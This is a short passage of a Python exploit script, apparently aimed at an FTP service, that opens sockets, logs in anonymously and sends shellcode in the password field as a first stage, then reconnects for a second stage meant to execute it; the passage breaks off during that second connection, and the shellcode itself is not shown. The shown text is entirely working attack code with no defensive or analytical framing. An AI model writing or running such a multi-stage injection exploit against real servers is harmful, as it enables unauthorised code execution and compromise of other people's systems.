...
# Stage 1: Shellcode sent into the program memory to be referenced later
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
sock.recv(1024)
sock.send("USER anonymous\r\n")
sock.recv(1024)
sock.send("PASS " + shellcode + "\r\n")
sock.recv(1024)
sock.close()

# Stage 2 shellcode to execute the injected stage 1 shellcode
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
sock.recv(1024)
sock.send("USER anonymous\r\n")
